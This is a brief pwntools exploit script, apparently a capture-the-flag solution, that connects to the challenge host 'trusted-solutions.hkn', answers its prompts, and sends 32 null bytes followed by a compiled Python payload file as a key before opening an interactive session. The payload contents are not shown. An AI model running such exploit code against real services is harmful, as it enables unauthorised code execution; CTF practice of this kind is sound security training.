from pwn import *

# conn = process("./trusted_partners")
conn = remote("trusted-solutions.hkn", 1024)

with open("payload.pyc", "rb") as f:
    payload = f.read()

conn.recvuntil(b": ")
conn.sendline(b"A")

conn.recvuntil(b":")
conn.sendline(b"69696969")

key = b"\x00" * 32
key += payload

conn.recvuntil(b":")
conn.sendline(key)

conn.interactive()
